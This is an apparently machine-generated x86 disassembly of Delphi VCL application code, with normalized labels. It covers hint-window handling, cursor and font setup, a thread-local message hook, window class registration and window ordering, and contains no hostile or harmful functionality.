test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_46781c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_4677f4
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406b44
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406ab8
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4678ac
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4679f1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469d9c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4241e4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_4241e4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_4242c8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4241e4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_4241e4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_4241e4
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_469d9c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_424028
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_424028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4679f8
cmp [ rw-data ] 0x0
je r-xdata
sub_467a30
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_467a90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_467bcc ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_467c40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_467398
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4185b0
mov dl [ ebp - 0x1 ]
call sub_467a90
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_467384
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418454
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41862c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4185b0
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_467a30
test al al
je r-xdata
inc esi
sub_467d8c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_467398
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_467384
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_467de4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_467d8c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467e5e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_467c40
pop ecx
push ebp
mov al 0x2
call sub_467c40
pop ecx
push ebp
mov al 0x3
call sub_467c40
pop ecx
push ebp
mov al 0x4
call sub_467c40
pop ecx
push ebp
mov al 0x5
call sub_467c40
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403154
retn
sub_467e6c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_467a00
xor eax eax
push ebp
push sub_467ee5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_467de4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_467a08
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_467f00
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f50
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403fa4
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_467f58
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_467f89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_46a3a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_467fac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_448698
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_46a420
sub_468008
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4694c0
sub_46804c
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_468008
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_467fac
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_4680c0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_46811c
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_46814c
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_468174
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_46811c
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_46814c
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_46814c
sub_4681b4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420fcc
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46988c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_428f40
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_429310
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46a024
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c458
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_469a84
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c480
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408754
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4041c0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46a200
mov eax ebx
call sub_46abc4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4684bc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46839d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403508
mov ebx edx
mov esi eax
mov eax esi
call sub_46abd4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46988c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_469a84
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46a420
xor edx edx
mov eax esi
call sub_469d9c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421018
push esi
push sub_4688f0
mov eax esi
call sub_469678
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4057bc
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403154
mov eax [ esi + 0x90 ]
call sub_403154
mov eax [ esi + 0x98 ]
call sub_403154
test bl bl
jle r-xdata
call sub_4220f4
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4684bc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46865d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468664
lea eax [ ebp - 0x2c ]
call sub_403f50
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_468a3c
call sub_42205c
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404410
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406bc4
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f50
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_469140
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_469140
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_46866c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_4673a0
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4686cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_418454
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_45071c
cmp ebx eax
je r-xdata
sub_46873c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4686cc
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4185b0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_468854
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4185b0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4688f0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c720
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_4678ac
mov eax [ rw-data ]
call sub_467ef4
sub_468948
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4689a5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4689ac
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404148
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_4689b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4689f0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
